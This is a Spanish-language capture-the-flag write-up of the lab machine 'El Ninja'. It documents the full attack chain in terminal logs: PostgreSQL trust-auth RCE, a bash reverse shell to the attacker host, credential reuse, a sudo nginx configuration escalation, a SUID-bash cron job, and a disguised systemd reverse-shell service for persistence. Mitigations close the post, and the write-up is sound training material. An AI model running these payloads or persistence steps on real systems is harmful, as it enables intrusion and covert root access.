---
title: "TheHackersLabs: El Ninja"
date: 2026-09-12
draft: false
tags: ["ctf", "thehackerslabs", "postgresql", "rce", "lfi", "sudo-nginx", "privilege-escalation", "persistencia"]
categories: ["writeups"]
summary: "Recorrido completo de la máquina El Ninja de TheHackersLabs: RCE mediante autenticación de confianza en PostgreSQL, movimiento lateral a través de credenciales expuestas en el filesystem, escalada de privilegios abusando de una regla sudo sobre nginx y persistencia mediante un servicio systemd."
sistema: ["linux"]
dificultad: "avanzado"
---

*Un recorrido completo de la máquina El Ninja, detallando la explotación de PostgreSQL configurado con autenticación de confianza (`trust`) para lograr ejecución remota de comandos, el movimiento lateral mediante credenciales filtradas en un fichero de configuración PHP legible globalmente, la escalada de privilegios abusando de una regla `sudo` mal acotada sobre `nginx`, y el establecimiento de persistencia sobre el sistema comprometido.*

**Publicado el 12 de septiembre de 2026 · Por Ne0t3k · 14 minutos de lectura**

La máquina El Ninja de TheHackersLabs combina una superficie de ataque amplia — cinco servicios expuestos, entre ellos una API en FastAPI, una aplicación Flask y un servicio Python a medida — con una cadena de explotación que en la práctica pivota sobre un único fallo grave: PostgreSQL accesible sin autenticación real. A partir de ahí, la filtración de credenciales en un fichero de configuración PHP permite el salto al usuario del sistema, y una regla `sudo` sobre `nginx` sin restricción de configuración habilita la lectura arbitraria de `/root` y, posteriormente, la escritura arbitraria mediante WebDAV para desplegar persistencia.

IP objetivo: `10.0.2.5`. IP atacante: `10.0.2.3`. Las flags se muestran parcialmente censuradas para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.

## Reconocimiento — Descubrimiento de host

El primer paso es identificar los hosts activos en el segmento de red del laboratorio:

<pre class="term-log">
<span class="cmd">$ nmap -sP 10.0.2.0/24</span>
</pre>

El barrido localiza cuatro hosts activos: `10.0.2.1` (gateway QEMU), `10.0.2.2` (NAT de VirtualBox), `10.0.2.3` (equipo atacante) y `10.0.2.5` (objetivo, MAC `08:00:27:9B:67:FF`, adaptador Oracle VirtualBox).

## Reconocimiento — Escaneo de puertos

Un primer intento de escaneo completo forzando una tasa de envío alta produjo resultados poco fiables:

<pre class="term-log">
<span class="cmd">$ nmap -A -sSV -p- --open --min-rate 5000 -n -Pn 10.0.2.5</span>
<span class="hl">Warning: RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span>
[...]
</pre>

Los avisos repetidos de `RTTVAR` y un número anómalamente alto de puertos marcados como `filtered` en lugar de `closed` son síntoma de pérdida de paquetes: `--min-rate 5000` fuerza un ritmo de envío que la latencia real del entorno virtualizado (en torno a 100 ms) no sostiene sin descartar respuestas. Se repite el escaneo sin forzar la tasa, dejando que Nmap autorregule el envío según el RTT observado:

<pre class="term-log">
<span class="cmd">$ nmap -A -sSV -p- --open -n -Pn 10.0.2.5</span>
PORT     STATE SERVICE    VERSION
<span class="hl">22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)</span>
<span class="hl">80/tcp   open  http       nginx 1.22.1 (Apache2 Debian Default Page)</span>
<span class="hl">1337/tcp open  http       Uvicorn</span>
<span class="hl">5000/tcp open  http       Werkzeug httpd 3.1.8 (Python 3.11.2) — "THL Ninjas"</span>
<span class="hl">5432/tcp open  postgresql PostgreSQL DB 15.15 - 15.16</span>
<span class="hl">9999/tcp open  abyss?     servicio custom en Python (/home/wvverez/server.py)</span>
</pre>

**Desglose de parámetros:**

- `-A`: activa detección de sistema operativo, versión de servicio, scripts NSE por defecto y traceroute en un único pase.
- `-sSV`: combina escaneo SYN semi-abierto con detección de versión de servicio.
- `-p-`: recorre el rango completo de 65535 puertos TCP.
- `--open`: muestra únicamente los puertos en estado abierto.
- `-n`: desactiva la resolución DNS inversa.
- `-Pn`: omite el descubrimiento de host previo (asume el objetivo activo), útil cuando el ICMP/ARP no es fiable o ya se confirmó la disponibilidad del host.

El escaneo revela cinco puertos TCP abiertos, una superficie notablemente más amplia que la de otras máquinas del mismo entorno:

- **Puerto 22 (SSH)**: OpenSSH 9.2p1 sobre Debian.
- **Puerto 80 (HTTP)**: nginx 1.22.1 sirviendo la página por defecto de Apache2 Debian, sin contenido de interés aparente.
- **Puerto 1337 (HTTP)**: servicio Uvicorn, típico de una API construida con FastAPI.
- **Puerto 5000 (HTTP)**: Werkzeug/Python 3.11.2 con título "THL Ninjas", indicando una aplicación Flask.
- **Puerto 5432 (PostgreSQL)**: PostgreSQL 15.15-15.16.
- **Puerto 9999**: servicio no identificado por la base de firmas de Nmap (`abyss?`), que resulta ser un script Python a medida.

El propio puerto 9999 filtra información valiosa sin necesidad de interacción compleja: una petición con una codificación de caracteres inesperada provoca un `UnicodeDecodeError` no controlado por excepciones, cuyo traceback revela la ruta absoluta `/home/wvverez/server.py`. Esto confirma, antes incluso de obtener acceso, la existencia de un usuario del sistema llamado `wvverez`.

La detección de sistema operativo de `-A` devolvió resultados contradictorios y poco fiables (mezcla de huellas compatibles con Linux 4.x/5.x y con MikroTik RouterOS), un artefacto habitual del fingerprinting remoto por TCP/IP stack en entornos virtualizados; se descarta como ruido y la versión real de kernel se confirma más adelante desde dentro del sistema.

## Explotación inicial — PostgreSQL sin autenticación real

### Acceso a la base de datos

Con el puerto 5432 abierto, se prueba el acceso con el rol por defecto `postgres` sin contraseña:

<pre class="term-log">
<span class="cmd">$ psql -h 10.0.2.5 -U postgres -w</span>
psql (15.x)
Type "help" for help.

postgres=#
</pre>

**Desglose de parámetros:**

- `-h`: host remoto al que conectar.
- `-U postgres`: fuerza el rol de conexión a `postgres`, el superusuario por defecto de la instalación.
- `-w`: nunca solicita contraseña de forma interactiva; si la autenticación configurada en el servidor es `trust`, la conexión se acepta directamente sin credencial alguna.

La conexión se acepta sin ninguna contraseña, confirmando que `pg_hba.conf` en el servidor tiene configurado el método `trust` para conexiones remotas — un fallo de configuración crítico que equivale a dejar la base de datos completamente abierta. Listado de bases disponibles:

<pre class="term-log">
<span class="cmd">postgres=# \l</span>
<span class="hl">postgres           | postgres</span>
template0          | postgres
template1          | postgres
<span class="hl">thlninjas_internal | superadmin</span>
</pre>

### Verificación de privilegios

<pre class="term-log">
<span class="cmd">postgres=# \du</span>
<span class="hl">postgres   | Superusuario, Crear rol, Crear BD, Replicación, Ignora RLS</span>
<span class="hl">superadmin | Superusuario</span>
</pre>

Ambos roles disponibles tienen atributo `Superusuario`. En PostgreSQL, un rol superusuario puede invocar la función `COPY ... FROM/TO PROGRAM`, que ejecuta un comando del sistema operativo y redirige su entrada o salida hacia la tabla. Esto convierte cualquier acceso con privilegios de superusuario en ejecución remota de comandos (RCE) directa, sin necesidad de extensiones adicionales como `plpgsql` con funciones inseguras.

### Confirmación de RCE

<pre class="term-log">
<span class="cmd">postgres=# CREATE TEMP TABLE result(result text);</span>
<span class="cmd">postgres=# COPY result FROM PROGRAM 'id';</span>
<span class="cmd">postgres=# SELECT * FROM result;</span>
<span class="hl">uid=104(postgres) gid=112(postgres) grupos=112(postgres),109(ssl-cert)</span>
</pre>

El resultado confirma ejecución de comandos como el usuario de sistema `postgres`, con grupo secundario `ssl-cert`.

### Reverse shell

Se levanta un listener en la máquina atacante:

<pre class="term-log">
<span class="cmd">$ nc -nlvp 443</span>
listening on [any] 443 ...
</pre>

Y se envía el payload de conexión inversa desde la sesión `psql`, evitando `PROGRAM 'id'` y usando en su lugar una subconsulta que ejecuta el comando sin depender de una tabla temporal previa:

<pre class="term-log">
<span class="cmd">postgres=# COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >&amp; /dev/tcp/10.0.2.3/443 0>&amp;1"';</span>
</pre>

Shell recibida en el listener, como usuario `postgres` y sin TTY completo:

<pre class="term-log">
<span class="hl-green">connect to [10.0.2.3] from (UNKNOWN) [10.0.2.5] 42288</span>
bash: no se puede establecer el grupo de proceso de terminal
bash: no hay control de trabajos en este shell
</pre>

### Tratamiento de la shell (TTY upgrade)

Antes de continuar la enumeración se estabiliza la sesión con el método clásico de PTY spawning:

<pre class="term-log">
<span class="cmd">$ python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
<span class="cmd"># Ctrl+Z</span>
<span class="cmd">$ stty raw -echo; fg</span>
<span class="cmd">$ export TERM=xterm-256color</span>
<span class="cmd">$ export SHELL=bash</span>
<span class="cmd">$ stty rows $(tput lines) columns $(tput cols)</span>
<span class="cmd">$ export PS1='\[\e[1;31m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '</span>
</pre>

**Desglose de parámetros:**

- `pty.spawn`: genera un pseudo-terminal completo dentro de la shell no interactiva recibida, requisito para que funcionen `Ctrl+C`, `clear` y el autocompletado.
- `stty raw -echo; fg`: tras suspender el proceso con `Ctrl+Z`, ajusta la terminal local a modo raw (sin eco duplicado) antes de retomarlo en primer plano, sincronizando el comportamiento de ambas terminales.
- `stty rows/columns`: iguala las dimensiones de la sesión remota a las de la terminal local, evitando el corte de líneas largas o el mal renderizado de herramientas interactivas.
- `PS1` personalizado: prompt coloreado que diferencia visualmente la sesión remota (rojo/azul) de la terminal local, reduciendo el riesgo de ejecutar un comando en la máquina equivocada.

## Movimiento lateral — postgres → wvverez

### Credenciales filtradas en el filesystem

<pre class="term-log">
<span class="cmd">$ ls -la /opt</span>
<span class="cmd">$ cat /opt/db.php</span>
&lt;?php
$db_credentials = [
    'username' => 'wvverez',
    <span class="hl">'password' => 'dun1bd12dh979d178gd5%djnashda'</span>
];
?&gt;
</pre>

El fichero tiene propietario `root:root` y permisos `644` (lectura global) — un fallo de configuración recurrente: un secreto de aplicación queda expuesto a cualquier usuario del sistema, incluido uno tan poco privilegiado como `postgres`.

### Cambio de usuario

<pre class="term-log">
<span class="cmd">$ su wvverez</span>
<span class="cmd">$ id && whoami</span>
<span class="hl">uid=1001(wvverez) gid=1001(wvverez) grupos=1001(wvverez),100(users)</span>
</pre>

### Flag de usuario

<pre class="term-log">
<span class="cmd">$ cd ~ &amp;&amp; ls -la</span>
<span class="cmd">$ cat user.txt</span>
<span class="hl-green">THL{HjdjadajndlldiuiubnioTHLSDAHDAPO}</span>
</pre>

El directorio personal de `wvverez` contiene la estructura completa de una aplicación: `api.py` (FastAPI/Uvicorn, puerto 1337), `app.py` (Flask, puerto 5000), `config.py`, `db.json`, `server.py` (el servicio del puerto 9999) y los directorios `ninja_web` y `templates`.

## Análisis de código — hallazgos adicionales

Estos hallazgos se documentan por su valor como evidencia de exposición de datos, pero no forman parte de la vía de escalada de privilegios finalmente explotada.

### LFI en app.py (Flask, puerto 5000)

`config.py` define `FILES_BASE = "/"`, usada en `app.py` dentro del endpoint `/dashboard?list=<path>` sin sanitización del parámetro `filename`:

<pre class="term-log">
filepath = os.path.join(FILES_BASE, filename)
with open(filepath, "r", errors="replace") as f:
    file_content = f.read()
</pre>

Esto constituye un arbitrary file read (LFI) confirmado a nivel de código fuente, alcanzable tras autenticarse con cualquier credencial válida de la aplicación (se usó `harry`, extraída de `db.json`, con rol `admin`).

### Prueba del LFI

<pre class="term-log">
<span class="cmd">$ curl -s -c cookies.txt -X POST http://10.0.2.5:5000/login -d "username=harry&amp;password=th3THLninj4p4sss3%cret!"</span>
<span class="cmd">$ curl -s -b cookies.txt "http://10.0.2.5:5000/dashboard?list=root/root.txt"</span>
<span class="hl">[ERROR] Permission denied: root/root.txt.</span>
</pre>

El LFI es funcional a nivel de aplicación, pero el proceso Flask se ejecuta con permisos de un usuario normal, no de root, por lo que no puede leer `/root/root.txt` directamente. Se descarta como vía directa a la flag de root, aunque queda documentado como hallazgo válido de la aplicación web.

### api.py — credenciales de la API interna

Expone en texto plano ocho pares de credenciales (`INTERNAL_USERS`) y una API key estática (`jerry:Meg4SUp3rPassw$%!dthl`) para el servicio FastAPI del puerto 1337. Ninguna de estas credenciales resultó válida para autenticación de sistema (`sudo`/PAM); son datos exclusivos de la capa de aplicación.

## Escalada de privilegios — wvverez → root

### Enumeración de privilegios sudo

<pre class="term-log">
<span class="cmd">$ sudo -l</span>
<span class="hl">User wvverez may run the following commands on TheHackersLabs-ElNinja:</span>
<span class="hl">    (root) NOPASSWD: /usr/sbin/nginx</span>
</pre>

Se confirma además que la restricción es exacta y sin excepciones: cualquier otro comando (`sudo kill`, etc.) es rechazado explícitamente por `sudoers`.

### Binarios SUID

<pre class="term-log">
<span class="cmd">$ find / -perm -4000 -type f 2>/dev/null</span>
</pre>

Únicamente binarios estándar del sistema (`su`, `sudo`, `passwd`, `mount`, etc.), sin hallazgos adicionales explotables.

### Explotación de sudo sobre nginx

`nginx` ejecutable como root sin restricción sobre el fichero de configuración es un vector de escalada bien conocido: al permitir especificar un `-c` arbitrario, el atacante controla completamente el comportamiento del proceso, incluido el propietario efectivo del worker. Se construye una configuración que sirve el contenido de `/root/` con listado de directorio habilitado:

<pre class="term-log">
user root;
worker_processes 1;
pid /tmp/nginx_evil2.pid;
error_log /tmp/nginx_evil2_error.log;
events { worker_connections 1024; }
http {
  server {
    listen 8889;
    location / {
      root /root/;
      autoindex on;
    }
  }
}
</pre>

**Notas del proceso de depuración:**

- Un primer intento sin la directiva `user root;` dejó el worker corriendo como `nobody`, insuficiente para atravesar el directorio `/root` (permisos restrictivos tipo `700`), resultando en `403 Forbidden`.
- Colocar `user root;` dentro del bloque `http {}` provocó el error de sintaxis `"user" directive is not allowed here`, ya que esa directiva solo es válida en el contexto principal (`main`), junto a `worker_processes`/`pid`/`error_log`.
- Tras mover `user root;` al contexto global, el worker pasó a ejecutar como root y el listado de `/root/` quedó accesible.

<pre class="term-log">
<span class="cmd">$ sudo /usr/sbin/nginx -c /tmp/evil_nginx.conf</span>
<span class="cmd">$ curl -s http://127.0.0.1:8889/</span>
Index of /
../
<span class="hl">root.txt   28-Apr-2026 16:51   22</span>
</pre>

### Flag de root

<pre class="term-log">
<span class="cmd">$ curl -s http://127.0.0.1:8889/root.txt</span>
<span class="hl-green">THL{DdahdjbasdbaRHGL}</span>
</pre>

## Post-explotación — persistencia como demostración de laboratorio

Con el objetivo del CTF ya cumplido, se realiza una demostración adicional y controlada de persistencia como root, reutilizando el mismo vector de escritura arbitraria vía `sudo nginx`, esta vez con WebDAV habilitado para escribir directamente sobre `/etc/cron.d/`.

### Servidor de escritura sobre /etc/cron.d/

<pre class="term-log">
user root;
worker_processes 1;
pid /tmp/nginx_cron.pid;
error_log /tmp/nginx_cron_error.log;
events { worker_connections 1024; }
http {
  server {
    listen 8891;
    location / {
      root /etc/cron.d/;
      dav_methods PUT;
      create_full_put_path on;
      dav_access user:rw group:r all:r;
    }
  }
}
</pre>

<pre class="term-log">
<span class="cmd">$ sudo /usr/sbin/nginx -c /tmp/evil_nginx_cron.conf</span>
</pre>

**Desglose de parámetros:**

- `dav_methods PUT`: habilita el método HTTP `PUT` del módulo WebDAV de nginx, permitiendo subir ficheros directamente al `root` configurado.
- `create_full_put_path on`: crea automáticamente los directorios intermedios necesarios si no existen.
- `dav_access user:rw group:r all:r`: fija los permisos del fichero resultante tras la subida.

### Payload de persistencia

Job de cron minimalista y observable, que regenera un binario bash con SUID cada minuto:

<pre class="term-log">
* * * * * root cp /bin/bash /tmp/rootbash &amp;&amp; chmod 4755 /tmp/rootbash
</pre>

### Despliegue vía HTTP PUT

<pre class="term-log">
<span class="cmd">$ curl -T /tmp/sysupdate http://127.0.0.1:8891/sysupdate</span>
<span class="cmd">$ sleep 90</span>
<span class="cmd">$ ls -la /tmp/rootbash</span>
<span class="hl-green">-rwsr-xr-x 1 root root 1265648 Sep 12 12:36 /tmp/rootbash</span>
</pre>

### Verificación de la escalada instantánea

<pre class="term-log">
<span class="cmd">$ /tmp/rootbash -p</span>
<span class="cmd">$ id</span>
<span class="cmd">$ whoami</span>
<span class="hl-green">uid=1001(wvverez) gid=1001(wvverez) euid=0(root) grupos=1001(wvverez),100(users)</span>
root
</pre>

Con `euid=0` confirmado, se dispone de una vía de escalada a root repetible en cualquier momento sin necesidad de rehacer la cadena completa de explotación (PostgreSQL → wvverez → sudo nginx).

## Persistencia — servicio systemd con reverse shell

Como cierre del ejercicio, se despliega además un servicio systemd persistente a nivel de sistema, que abre una reverse shell hacia la máquina atacante en cada arranque:

<pre class="term-log">
root@TheHackersLabs-ElNinja:~# <span class="cmd">nano /etc/systemd/system/lab-elninja-persistence.service</span>
root@TheHackersLabs-ElNinja:~# <span class="cmd">cat /etc/systemd/system/lab-elninja-persistence.service</span>
[Unit]
Description=Lab persistence PoC (El Ninja CTF - laboratorio autorizado) - reverse shell a 10.0.2.3:4444
After=network.target

[Service]
<span class="hl">ExecStart=/usr/local/bin/.sys-healthcheck</span>
Restart=always
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target

root@TheHackersLabs-ElNinja:~# <span class="cmd">systemctl daemon-reload</span>
root@TheHackersLabs-ElNinja:~# <span class="cmd">systemctl enable lab-elninja-persistence.service</span>
Created symlink /etc/systemd/system/multi-user.target.wants/lab-elninja-persistence.service → /etc/systemd/system/lab-elninja-persistence.service.
root@TheHackersLabs-ElNinja:~# <span class="cmd">systemctl start lab-elninja-persistence.service</span>
root@TheHackersLabs-ElNinja:~# <span class="cmd">systemctl status lab-elninja-persistence.service</span>
<span class="hl-green">● lab-elninja-persistence.service - Lab persistence PoC (El Ninja CTF - laboratorio autorizado)</span>
     Loaded: loaded (/etc/systemd/system/lab-elninja-persistence.service; enabled; preset: enabled)
     Active: active (running)
</pre>

**Desglose de parámetros:**

- `ExecStart=/usr/local/bin/.sys-healthcheck`: apunta a un script oculto (prefijo `.`) con nombre camuflado como una comprobación de salud del sistema, en lugar de invocar directamente `bash -i` — reduce la visibilidad del payload real ante una inspección superficial del fichero `.service`.
- `Restart=always` / `RestartSec=30`: reinicia el servicio automáticamente si el proceso termina, espaciando los reintentos 30 segundos.
- `User=root`: fija explícitamente el usuario de ejecución, evitando depender de que systemd herede el contexto del proceso que crea la unidad.
- `WantedBy=multi-user.target`: integra el servicio en el target estándar de arranque multiusuario.

Verificación desde la máquina atacante:

<pre class="term-log">
<span class="cmd">$ nc -lvnp 4444</span>
listening on [any] 4444 ...
<span class="hl-green">connect to [10.0.2.3] from (UNKNOWN) [10.0.2.5] 49138</span>
bash: no se puede establecer el grupo de proceso de terminal (1627): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@TheHackersLabs-ElNinja:/# <span class="cmd">id &amp;&amp; whoami</span>
<span class="hl-green">uid=0(root) gid=0(root) grupos=0(root)</span>
root
</pre>

Los avisos de "grupo de proceso de terminal" y "sin control de trabajos" son, de nuevo, habituales en shells no interactivas obtenidas por reverse shell al carecer de TTY asignado; no afectan a la funcionalidad de la sesión root obtenida.

## Conclusión

La cadena de compromiso de El Ninja se sostiene sobre tres fallos que, por separado, ya serían críticos: PostgreSQL expuesto con autenticación `trust` (equivalente a sin autenticación) y roles superusuario que habilitan RCE directa vía `COPY ... TO/FROM PROGRAM`, un secreto de aplicación en `/opt/db.php` legible por cualquier usuario del sistema, y una regla `sudo` sobre `nginx` sin restricción del fichero de configuración, que permite tanto lectura como escritura arbitraria una vez controlado el contexto de ejecución del worker. A ello se suma, ya en fase de post-explotación, la ausencia de controles que impidan a un proceso con privilegios de root crear unidades systemd o entradas de cron arbitrarias, lo que convierte cualquier obtención puntual de root en persistencia indefinida si no se audita el sistema tras el incidente.

## Recomendaciones de mitigación

**PostgreSQL en trust:** forzar `scram-sha-256` en `pg_hba.conf` para todas las conexiones remotas y restringir el rango de IPs permitidas por línea de host, evitando el método `trust` fuera de `localhost`, tal como advierte la [documentación oficial de PostgreSQL sobre autenticación trust](https://www.postgresql.org/docs/current/auth-trust.html). Revisar que ningún rol con atributo `Superusuario` sea alcanzable sin credencial, dado que habilita RCE directa vía `COPY ... TO/FROM PROGRAM`.

**Exposición de secretos en el filesystem:** retirar permisos de lectura global (`644`) sobre ficheros de configuración con credenciales embebidas, aplicando `640` con propietario de servicio dedicado, y migrar las credenciales a variables de entorno o un gestor de secretos fuera del árbol de la aplicación. Incorporar una revisión de permisos de ficheros sensibles como paso posterior a cada despliegue.

**Sudo mal acotado sobre nginx:** sustituir la regla `sudo (root) NOPASSWD: /usr/sbin/nginx` por una que restrinja el argumento `-c` a un fichero de configuración fijo y de confianza, o eliminarla si no existe justificación operativa clara. Cualquier regla `sudo` que permita a un binario especificar su propia configuración habilita en la práctica ejecución de código arbitrario con los privilegios del rol asignado.

**LFI en el endpoint /dashboard:** sanear el parámetro `filename` mediante lista blanca de rutas permitidas o normalización con `os.path.realpath`, comprobando que la ruta resultante permanece dentro de un directorio base autorizado antes de abrir el fichero.

**Persistencia mediante systemd y cron:** monitorizar la creación de unidades en `/etc/systemd/system/` y entradas en `/etc/cron.d/` con reglas de `auditd` (`-w /etc/systemd/system -p wa`, `-w /etc/cron.d -p wa`) o herramientas de integridad como `AIDE`. Corresponde a la técnica [T1053 (Scheduled Task/Job) de MITRE ATT&CK](https://attack.mitre.org/techniques/T1053/), con la sub-técnica [T1053.003 (Cron)](https://attack.mitre.org/techniques/T1053/003/) específica para el vector de persistencia vía cron documentado en este ejercicio.
</content>
